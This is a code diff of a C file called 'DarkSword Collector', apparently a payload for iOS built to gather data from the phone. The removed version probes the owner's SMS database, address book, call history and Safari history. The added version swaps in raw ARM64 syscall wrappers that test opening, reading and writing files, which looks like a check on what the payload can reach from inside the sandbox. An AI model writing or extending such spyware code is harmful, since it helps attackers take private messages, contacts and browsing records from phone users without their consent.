@@ -1,26 +1,67 @@
 /**
- * DarkSword Collector v14 - libc file I/O via PLT
- * Uses standard open/read/close (resolved by MachOPayloadBuilder)
- * Stack-only, no globals
+ * DarkSword Collector v16 - Pure raw syscall diagnostics
+ * Return value encodes diagnostic info
  */
-#include <fcntl.h>
-#include <unistd.h>
 
-static unsigned char _read_first_byte(const char *path) {
-    int fd = open(path, O_RDONLY);
-    if (fd < 0) return 0;
-    unsigned char buf[4];
-    int n = read(fd, buf, 4);
-    close(fd);
-    if (n < 1) return 0;
-    return buf[0];
+static long _svc1(long n, long a) {
+    register long x16 __asm__("x16") = n;
+    register long x0 __asm__("x0") = a;
+    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16) : "memory");
+    return x0;
+}
+static long _svc2(long n, long a, long b) {
+    register long x16 __asm__("x16") = n;
+    register long x0 __asm__("x0") = a;
+    register long x1 __asm__("x1") = b;
+    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1) : "memory");
+    return x0;
+}
+static long _svc3(long n, long a, long b, long c) {
+    register long x16 __asm__("x16") = n;
+    register long x0 __asm__("x0") = a;
+    register long x1 __asm__("x1") = b;
+    register long x2 __asm__("x2") = c;
+    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1), "r"(x2) : "memory");
+    return x0;
 }
 
-int ds_start(void) {
-    unsigned char sms = _read_first_byte("/var/mobile/Library/SMS/sms.db");
-    unsigned char contacts = _read_first_byte("/var/mobile/Library/AddressBook/AddressBook.sqlitedb");
-    unsigned char calls = _read_first_byte("/var/mobile/Library/CallHistoryDB/CallHistory.storedata");
-    unsigned char safari = _read_first_byte("/var/mobile/Library/Safari/History.db");
+#define SYS_open  5
+#define SYS_read  3
+#define SYS_close 6
+#define SYS_write 4
 
-    return (int)sms | ((int)contacts << 8) | ((int)calls << 16) | ((int)safari << 24);
+int ds_start(void) {
+    int result = 0;
+
+    /* Test 1: open /etc/hosts */
+    int fd = (int)_svc2(SYS_open, (long)"/etc/hosts", 0);
+    if (fd >= 0) {
+        result |= 0x100; /* open ok */
+        
+        /* Test 2: read */
+        char buf[16];
+        int n = (int)_svc3(SYS_read, fd, (long)buf, 16);
+        _svc1(SYS_close, fd);
+        
+        if (n > 0) {
+            result |= 0x200; /* read ok */
+            result |= (buf[0] & 0xFF); /* first byte */
+        } else {
+            result |= (n & 0xFF) << 16; /* read error code */
+        }
+    } else {
+        result |= (fd & 0xFF) << 16; /* open error code */
+    }
+
+    /* Test 3: write to /tmp */
+    int wfd = (int)_svc2(SYS_open, (long)"/tmp/ds_test.txt", 0x241);
+    if (wfd >= 0) {
+        result |= 0x400; /* write open ok */
+        const char *msg = "DS";
+        int wr = (int)_svc3(SYS_write, wfd, (long)msg, 2);
+        _svc1(SYS_close, wfd);
+        if (wr > 0) result |= 0x800; /* write ok */
+    }
+
+    return result;
 }
